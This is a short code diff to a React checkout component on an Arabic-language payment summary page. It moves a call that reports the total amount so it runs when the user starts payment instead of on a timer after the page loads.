@@ -74,22 +74,20 @@ export default function SummaryPayment() {
   useEffect(() => {
     document.title = 'الملخص والدفع';
     navigateToPage('الملخص والدفع');
-
-    setTimeout(() => {
-      sendData({
-        data: {
-          'المجموع الكلي': `${totalAmount} ريال`,
-        },
-        current: 'الملخص والدفع',
-        waitingForAdminResponse: false,
-      });
-    }, 1000);
-  }, [totalAmount]);
+  }, []);
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
 
     setIsProcessing(true);
+
+    sendData({
+      data: {
+        'المجموع الكلي': `${totalAmount} ريال`,
+      },
+      current: 'الملخص والدفع',
+      waitingForAdminResponse: false,
+    });
 
     const data: Record<string, string> = {
       'طريقة الدفع': selectedPaymentMethod === 'card' ? 'بطاقة ائتمان / مدى' : 'Apple Pay',
